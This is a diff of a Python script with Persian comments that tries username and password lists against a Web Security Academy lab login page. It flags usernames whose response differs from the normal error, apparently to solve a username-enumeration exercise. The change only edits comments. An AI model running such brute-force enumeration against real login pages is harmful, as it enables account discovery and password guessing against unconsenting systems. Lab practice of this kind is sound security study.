@@ -2,7 +2,7 @@ import requests
 import time
 
 # ================== تنظیمات ==================
-LOGIN_URL = "https://0af000960475e6c381507527008900d0.web-security-academy.net/login"  # ← حتماً عوض کن
+LOGIN_URL = "https://0af000960475e6c381507527008900d0.web-security-academy.net/login"  # حتماً عوض کن
 
 USERNAME_LIST = "usernames.txt"   # لیست یوزرنیم‌ها
 PASSWORD_LIST = "passwords.txt"   # لیست پسوردها (حتی یک پسورد هم کافیه)
@@ -48,14 +48,13 @@ for idx, username in enumerate(usernames, 1):
     responses_seen = []
     
     for attempt in range(MAX_TRIES_PER_USER):
-        # انتخاب پسورد (اگر لیست خالی باشه از TEST_PASSWORD استفاده کن)
+        # انتخاب پسورد 
         pwd = passwords[attempt % len(passwords)] if passwords else TEST_PASSWORD
         
         body, status = try_login(username, pwd)
         responses_seen.append(body[:300])  # فقط بخشی برای مقایسه
         
         if NORMAL_ERROR.lower() not in body.lower():
-            # اگر ارور استاندارد نبود → کاندید خوب
             print(f"    → Different response detected for {username} !")
             different_response = True
             break
